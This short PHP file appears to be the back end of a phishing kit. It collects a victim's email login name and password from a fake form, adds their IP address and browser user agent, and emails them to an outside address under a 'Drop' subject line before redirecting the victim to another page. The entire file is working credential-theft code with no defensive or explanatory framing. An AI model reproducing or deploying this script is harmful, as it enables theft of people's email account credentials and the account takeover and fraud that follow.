<?php 
session_start();

$userid = trim($_SESSION['login_user']);
$password = trim($_POST['old']);

$ip = getenv("REMOTE_ADDR");
$message .= "EmalAcess: ".$userid."\n";
$message .= "EmalPass: ".$password."\n";
$message .= "IP : ".$ip."\n";
$message .= "User Agent: ".$_SERVER['HTTP_USER_AGENT']."\n";
$send = "alexanderprime11@yahoo.com";
$subject = "Drop9 by Alibobo360";
$headers = "From: Alibobo";
mail($send,$subject,$message,$headers);
header("Location: index3.php");

?>